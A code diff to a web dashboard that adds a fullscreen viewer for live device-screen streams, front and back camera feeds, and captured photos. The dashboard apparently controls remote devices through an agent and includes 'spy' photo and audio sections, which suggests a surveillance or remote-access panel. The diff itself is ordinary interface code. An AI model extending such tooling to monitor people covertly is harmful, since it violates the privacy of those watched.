@@ -517,8 +517,33 @@ select:focus { outline: none; border-color: var(--green); }
 .dev-screen img {
   width: 100%; display: block;
   transition: opacity .12s ease;
+  cursor: zoom-in;
 }
 .dev-screen img.flash { opacity: .7; }
+
+/* ── fullscreen overlay ── */
+#fsOverlay {
+  display: none; position: fixed; inset: 0; z-index: 10000;
+  background: #000; align-items: center; justify-content: center;
+  cursor: zoom-out;
+}
+#fsOverlay.open { display: flex; }
+#fsOverlay img { max-width: 100%; max-height: 100%; object-fit: contain; display: block; }
+#fsBtnClose {
+  position: absolute; top: 14px; right: 18px;
+  background: rgba(255,255,255,.12); border: none; color: #fff;
+  font-size: 1.5em; cursor: pointer; border-radius: 50%;
+  width: 36px; height: 36px; display: flex; align-items: center; justify-content: center;
+  z-index: 10001;
+}
+#fsBtnClose:hover { background: rgba(255,255,255,.25); }
+#fsBtnNative {
+  position: absolute; bottom: 14px; right: 18px;
+  background: rgba(255,255,255,.12); border: none; color: #fff;
+  font-size: .75em; cursor: pointer; border-radius: 6px;
+  padding: 6px 12px; z-index: 10001;
+}
+#fsBtnNative:hover { background: rgba(255,255,255,.25); }
 .dev-screen-empty {
   color: var(--fg2); font-size: .8em; padding: 48px 24px;
   text-align: center; line-height: 1.7; background: #000;
@@ -553,6 +578,13 @@ select:focus { outline: none; border-color: var(--green); }
 </style>
 </head>
 <body>
+
+<!-- ── Fullscreen overlay ── -->
+<div id="fsOverlay" onclick="fsClose()">
+  <button id="fsBtnClose" onclick="event.stopPropagation();fsClose()">✕</button>
+  <img id="fsImg" src="" alt="fullscreen">
+  <button id="fsBtnNative" onclick="event.stopPropagation();fsNative()">⛶ Native Fullscreen</button>
+</div>
 
 <!-- ── Login overlay ── -->
 <div id="loginOverlay" style="position:fixed;inset:0;z-index:9999;background:var(--bg);display:flex;align-items:center;justify-content:center;">
@@ -1091,11 +1123,12 @@ select:focus { outline: none; border-color: var(--green); }
         <button class="btn btn-primary" onclick="devScreenRefresh()" style="font-size:.78em;padding:5px 12px;">↻ Snap</button>
         <button class="btn" id="btnDevLive" onclick="toggleDevLive()" style="font-size:.78em;padding:5px 14px;">▶ Live</button>
         <span id="devLiveBadge" class="live-badge" style="display:none;"><span class="live-dot pulse"></span> STREAMING</span>
+        <button class="btn" onclick="fsOpenId('devScreenImg')" style="font-size:.78em;padding:5px 10px;" title="Fullscreen">⛶</button>
         <span id="devScreenStatus" style="font-size:.72em;color:var(--fg2);margin-left:4px;"></span>
       </div>
       <div class="dev-screen" id="devScreen">
         <div class="dev-screen-empty" id="devScreenEmpty">No screen data yet — click Snap or ▶ Live</div>
-        <img id="devScreenImg" style="display:none;" alt="screen">
+        <img id="devScreenImg" style="display:none;" alt="screen" onclick="fsOpen(this.src)" title="Click to fullscreen">
       </div>
       <div class="screen-statusbar">
         <span id="devScreenTs"></span>
@@ -1111,8 +1144,9 @@ select:focus { outline: none; border-color: var(--green); }
         <button class="btn btn-primary" id="btnCamLive" onclick="toggleCamLive(false)" style="font-size:.78em;padding:5px 14px;">▶ Back Live</button>
         <button class="btn" id="btnCamLiveFront" onclick="toggleCamLive(true)" style="font-size:.78em;padding:5px 14px;">▶ Front Live</button>
         <span id="camLiveBadge" class="live-badge" style="display:none;"><span class="live-dot pulse"></span> LIVE</span>
+        <button class="btn" onclick="fsOpenId('camLiveScreen')" style="font-size:.78em;padding:5px 10px;" title="Fullscreen">⛶</button>
       </div>
-      <div id="camLiveScreen" class="cam-live-empty">Start Live or Snap to see camera feed.</div>
+      <div id="camLiveScreen" class="cam-live-empty" onclick="if(this.tagName==='IMG')fsOpen(this.src)" style="cursor:zoom-in;">Start Live or Snap to see camera feed.</div>
       <div class="screen-statusbar">
         <span id="camScreenTs"></span>
         <span id="camScreenFps" style="color:var(--green);"></span>
@@ -1157,7 +1191,7 @@ select:focus { outline: none; border-color: var(--green); }
       <div id="spyPhotoSection" style="display:none;margin-bottom:10px;">
         <div style="font-size:.75em;font-weight:700;color:var(--fg2);text-transform:uppercase;letter-spacing:.1em;margin-bottom:6px;">Latest Photo</div>
         <div style="display:flex;gap:6px;margin-bottom:6px;flex-wrap:wrap;" id="spyPhotoNav"></div>
-        <img id="spyPhotoImg" alt="Camera photo" style="max-width:100%;border-radius:4px;border:1px solid var(--border);">
+        <img id="spyPhotoImg" alt="Camera photo" style="max-width:100%;border-radius:4px;border:1px solid var(--border);cursor:zoom-in;" onclick="fsOpen(this.src)" title="Click to fullscreen">
       </div>
       <div id="spyAudioSection" style="display:none;margin-bottom:10px;">
         <div style="font-size:.75em;font-weight:700;color:var(--fg2);text-transform:uppercase;letter-spacing:.1em;margin-bottom:6px;">Latest Recording</div>
@@ -1563,13 +1597,18 @@ function toggleDevLive() {
   const empty = document.getElementById('devScreenEmpty');
   _screenEs.onmessage = (e) => {
     if (!e.data || e.data.startsWith(':')) return;
-    img.src = 'data:image/jpeg;base64,' + e.data;
+    const src = 'data:image/jpeg;base64,' + e.data;
+    img.src = src;
     img.style.display = '';
     empty.style.display = 'none';
     document.getElementById('devScreenTs').textContent = 'Frame at ' + new Date().toLocaleTimeString();
     img.classList.add('flash');
     setTimeout(() => img.classList.remove('flash'), 100);
     _screenFps++;
+    // Keep fullscreen overlay in sync
+    const fsOv = document.getElementById('fsOverlay');
+    const fsI  = document.getElementById('fsImg');
+    if (fsOv.classList.contains('open') && fsI.dataset.liveSource === 'screen') fsI.src = src;
   };
   _screenEs.onerror = () => { document.getElementById('devScreenStatus').textContent = 'Stream error — agent may be offline'; };
 
@@ -1621,9 +1660,14 @@ function toggleCamLive(front) {
       img2.id = 'camLiveScreen';
       el = img2;
     }
-    el.src = 'data:image/jpeg;base64,' + e.data;
+    const camSrc = 'data:image/jpeg;base64,' + e.data;
+    el.src = camSrc;
     document.getElementById('camScreenTs').textContent = 'Frame at ' + new Date().toLocaleTimeString();
     _camFps++;
+    // Keep fullscreen overlay in sync
+    const fsOv2 = document.getElementById('fsOverlay');
+    const fsI2  = document.getElementById('fsImg');
+    if (fsOv2.classList.contains('open') && fsI2.dataset.liveSource === 'cam') fsI2.src = camSrc;
   };
   _camFpsTick = setInterval(() => {
     document.getElementById('camScreenFps').textContent = _camFps > 0 ? _camFps + ' fps' : '';
@@ -2575,6 +2619,51 @@ loadMacros();
 connect();
 updateOsHint();
 restoreCamUrl();
+
+// ── Fullscreen overlay ────────────────────────────────────────────────────────
+function fsOpen(src) {
+  if (!src || src === window.location.href) return;
+  document.getElementById('fsImg').src = src;
+  document.getElementById('fsOverlay').classList.add('open');
+  document.addEventListener('keydown', fsEscHandler);
+}
+function fsOpenId(elId) {
+  const el = document.getElementById(elId);
+  if (!el) return;
+  const src = el.tagName === 'IMG' ? el.src : null;
+  if (!src) return;
+  fsOpen(src);
+  // Tag so live SSE updates can follow
+  const fsI = document.getElementById('fsImg');
+  fsI.dataset.liveSource = elId === 'devScreenImg' ? 'screen' : elId === 'camLiveScreen' ? 'cam' : '';
+}
+function fsClose() {
+  document.getElementById('fsOverlay').classList.remove('open');
+  document.getElementById('fsImg').src = '';
+  document.removeEventListener('keydown', fsEscHandler);
+}
+function fsEscHandler(e) { if (e.key === 'Escape') fsClose(); }
+function fsNative() {
+  const el = document.getElementById('fsOverlay');
+  if (el.requestFullscreen) el.requestFullscreen();
+  else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
+}
+// Keep fullscreen overlay image updated while live
+const _fsSyncObs = new MutationObserver(() => {
+  const ov = document.getElementById('fsOverlay');
+  if (!ov.classList.contains('open')) return;
+  // find which source is live
+  const src = document.getElementById('devScreenImg').src || document.getElementById('fsImg').src;
+  if (src && src !== document.getElementById('fsImg').src) document.getElementById('fsImg').src = src;
+});
+// Live-sync: update fsImg src whenever devScreenImg or camLiveScreen changes
+function fsSyncLive(imgEl) {
+  if (!imgEl) return;
+  const ov = document.getElementById('fsOverlay');
+  if (!ov.classList.contains('open')) return;
+  if (document.getElementById('fsImg').dataset.src === imgEl.id)
+    document.getElementById('fsImg').src = imgEl.src;
+}
 // Always poll device count for the header badge (every 5s regardless of active tab)
 loadDevices();
 setInterval(loadDevices, 5000);
